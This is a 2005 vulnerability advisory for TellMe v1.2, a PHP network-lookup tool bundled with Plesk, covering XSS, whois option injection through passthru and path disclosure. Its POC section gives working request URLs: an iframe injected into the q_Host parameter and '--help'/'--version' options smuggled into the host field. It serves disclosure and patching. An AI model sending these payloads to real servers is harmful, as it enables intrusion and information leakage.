------------------------------------------------------------
    - EXPL-A-2005-015 exploitlabs.com Advisory 044 -
------------------------------------------------------------
                              - TellMe -





AFFECTED PRODUCTS
=================
TellMe v1.2 and earlier
http://kimihia.org.nz/projects/
http://kimihia.org.nz/projects/tellme/



OVERVIEW
========
Tellme - get all the lowdown details on an address
Tellme is used to discern what a computer is running,
 and also to help track down servers.
It combines together into one place traceroute tools,
 head requests, server examination, and whois lookups.

TellMe is used widely in default Plesk installs as a bundled
3rd party add on.



DETAILS
=======
1. XSS

TellMe does not properly filter malicious script content.
XSS my be inserted in the "IP" or "HOST"parameter.
The malicious script is then rendered and executed in the
 context of the users brower.



2. command option access

Tellme allows access to comand line options of the whois function via:
  render_Open("WHOIS");
 if ( $q_Host )
  passthru(EscapeShellCmd("whois " . $q_This));



3. information disclosure

TellMe discloses path information in error output, echoing
 back the full path to the script.




POC
===
1.
------
 by script inclusion in the "q_host" parameter
http://[host]/tellme/index.php?q_Host=<iframe
src=http://whatismyip.com></iframe>


2.
------
 by prepending "--*" options to the host entry
http://[host]/net/index.php?q_IP=&q_Host=--version+test.com&o_WhoIs=on
http://[host]/net/index.php?q_IP=&q_Host=--help+test.com&o_WhoIs=on


3.
-----
 by prepending "--" to the Server and HEAD options
http://[host]/net/index.php?q_IP=&q_Host=--+test.com&o_Server=on&o_Head=on

Warning:  fsockopen(): unable to connect to --help test.com:80
 in /home/httpd/vhosts/[VHOSTUSER]/httpdocs/net/index.php on line 246





SOLUTION:
=========
vendor contact:
Sept 29, 2005
project-tellme@kimihia.org.nz ( returned )
http://kimihia.org.nz/about/feedback/

Vendor response:
Oct 4, 2005

The author has released an updated version and a diff patch, available at:

Here is the new version:
http://kimihia.org.nz/projects/tellme/files/tellme-1.3_php3.txt

Here is a diff:
http://kimihia.org.nz/projects/tellme/files/tellme-1.2-1.3.diff

Here is the new README:
http://kimihia.org.nz/projects/tellme/files/tellme.txt





Credits
=======
This vulnerability was discovered and researched by
Donnie Werner of exploitlabs


mail:   wood at exploitlabs.com
mail:   morning_wood at zone-h.org
-- 
web: http://exploitlabs.com
web: http://zone-h.org

orig: http://exploitlabs.com/files/advisories/EXPL-A-2005-015-tellme.txt
_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
